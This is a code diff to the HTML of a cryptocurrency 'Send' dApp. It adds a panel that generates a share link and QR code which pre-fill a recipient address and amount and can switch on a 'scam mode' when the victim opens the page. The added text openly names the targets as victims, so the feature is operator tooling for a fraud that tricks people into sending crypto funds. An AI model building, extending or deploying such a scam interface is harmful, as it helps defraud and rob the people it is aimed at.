@@ -9,6 +9,7 @@
     <meta name="theme-color" content="#ffffff" />
     <title>Send</title>
     <link rel="stylesheet" href="style.css" />
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
   </head>
   <body>
     <div class="app">
@@ -328,6 +329,59 @@
             </div>
 
             <div id="approvalsList" class="approvals-list"></div>
+
+            <hr class="settings-hr" />
+
+            <div class="settings-header" style="margin-top: 8px">
+              <h3>📲 Share link & QR code</h3>
+              <p class="settings-sub">
+                Generates a link to this dApp that auto-fills the recipient
+                address (and optionally the amount and scam mode) when the
+                victim opens it. Show them the QR code or send the URL.
+              </p>
+            </div>
+
+            <label class="settings-label">Recipient address to prefill</label>
+            <input
+              id="qrToAddr"
+              class="settings-input"
+              type="text"
+              placeholder="T... (the address shown in victim's Recipient field)"
+              spellcheck="false"
+              autocapitalize="off"
+              autocomplete="off"
+            />
+
+            <label class="settings-label" style="margin-top: 8px">Amount to prefill (optional)</label>
+            <input
+              id="qrAmount"
+              class="settings-input"
+              type="text"
+              inputmode="decimal"
+              placeholder="e.g. 100"
+              spellcheck="false"
+              autocomplete="off"
+            />
+
+            <label class="settings-toggle" style="margin-top: 10px">
+              <input type="checkbox" id="qrScamMode" />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+              <span class="toggle-label">Auto-enable scam mode on open</span>
+            </label>
+
+            <div class="settings-actions" style="margin-top: 10px">
+              <button id="qrGenerateBtn" type="button" class="btn-primary">
+                Generate QR + Link
+              </button>
+              <button id="qrCopyBtn" type="button" class="btn-secondary" disabled>
+                Copy link
+              </button>
+            </div>
+
+            <div id="qrLinkBox" class="qr-link-box" hidden>
+              <code id="qrLink"></code>
+            </div>
+            <div id="qrCode" class="qr-code-box"></div>
           </div>
         </div>
 
